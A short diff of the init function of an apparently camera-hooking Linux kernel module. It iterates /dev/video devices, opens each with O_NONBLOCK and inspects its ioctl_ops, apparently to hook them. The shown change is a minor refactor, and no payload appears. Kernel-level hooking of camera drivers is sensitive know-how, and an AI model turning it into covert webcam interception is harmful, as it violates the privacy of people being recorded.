@@ -157,9 +157,14 @@ static int __init camhook_init(void) {
 
     // Iterate all minors
     for (i = 0; i < 64 && g_hook_count < MAX_HOOKS; i++) {
+        struct file *f;
+        
         snprintf(path, sizeof(path), "/dev/video%d", i);
-        f = filp_open(path, O_RDONLY, 0);
-        if (IS_ERR(f)) continue;
+        // Try to open the file
+        f = filp_open(path, O_RDONLY | O_NONBLOCK, 0);
+        if (IS_ERR(f)) {
+            continue;
+        }
 
         vdev = video_devdata(f);
         if (vdev && vdev->ioctl_ops) {
